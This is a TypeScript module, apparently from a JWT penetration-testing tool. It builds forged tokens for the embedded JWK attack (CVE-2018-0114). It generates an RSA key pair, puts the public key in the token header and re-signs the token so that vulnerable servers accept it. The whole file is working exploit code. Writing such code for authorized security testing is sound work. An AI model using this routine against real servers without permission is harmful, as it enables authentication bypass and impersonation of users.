/**
 * Embedded JWK Attack (CVE-2018-0114)
 *
 * Generates a fresh RSA key pair, injects the public key as a "jwk" header
 * parameter, and re-signs the token with the new private key.
 * Vulnerable servers that trust the embedded jwk for verification will accept
 * this token.
 *
 * The RSA key pair is generated in pure JS (BigInt) since LLRT has no native
 * key generation. A pair can be supplied by the caller so it is reused across
 * attack categories instead of regenerated each time.
 */

import { signRSA } from "../crypto/jwt.js";
import { generateRSAKeyPair, type RSAKeyPair } from "../crypto/rsa.js";
import type { ParsedJWT, AttackResult } from "../types.js";
import { nanoid } from "../util.js";

export function buildEmbeddedJWKAttacks(
  parsed: ParsedJWT,
  rsaKeyPair?: RSAKeyPair
): AttackResult[] {
  const results: AttackResult[] = [];

  const kp = rsaKeyPair ?? generateRSAKeyPair(2048);

  const header = {
    ...parsed.header,
    alg: "RS256",
    jwk: { ...kp.publicJwk, kid: "jwt-attacker-jwk" },
    kid: "jwt-attacker-jwk",
    // Remove fields that could conflict with the embedded jwk
    jku: undefined,
    x5u: undefined,
    x5c: undefined,
  };

  const jwt = signRSA(
    header as Parameters<typeof signRSA>[0],
    parsed.payload,
    kp.privateKeyPem,
    "RS256"
  );

  results.push({
    id: nanoid(),
    technique: "embeddedJwk",
    techniqueName: "Embedded JWK (RS256)",
    description:
      "CVE-2018-0114: Generates a fresh RSA key pair and embeds the public key in the JWT " +
      'header as a "jwk" parameter, then re-signs with the corresponding private key. ' +
      "Vulnerable servers that use the embedded jwk field for verification will accept this.",
    modifiedJWT: jwt,
    timestamp: Date.now(),
  });

  return results;
}
